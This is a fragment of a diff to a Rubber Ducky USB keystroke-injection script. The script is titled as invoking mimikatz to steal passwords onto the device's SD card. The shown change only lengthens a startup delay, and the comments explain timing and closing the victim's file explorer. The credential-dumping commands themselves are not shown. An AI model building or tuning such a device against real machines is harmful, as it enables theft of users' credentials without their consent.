@@ -2,7 +2,7 @@ REM Title: Invoke mimikatz and save passwords to the rubber ducky SD. You must d
 REM Author: Hak5Darren Props: Mubix, Clymb3r, Gentilkiwi. MODIFIED BY 4LON3LY0
 REM 
 REM Add 100 for each gb of your micro SD card. The default is 200 because normally the rubber ducky is used with 4Gb micro SDs.
-DELAY 200
+DELAY 400
 REM The next two lines are because a twin duck rubber ducky is detected by the computer as a normal USB drive, and normally it open the file explorer in the USB, for not have that problem when all is being executed, we wait until it is opened and we close it. If your victim has not it configured to open the file explorer when a new USB device is plugged on or is a machine without any GUI, for example, a server, comment or remove the next two lines.
 DELAY 3500
 ALT F4
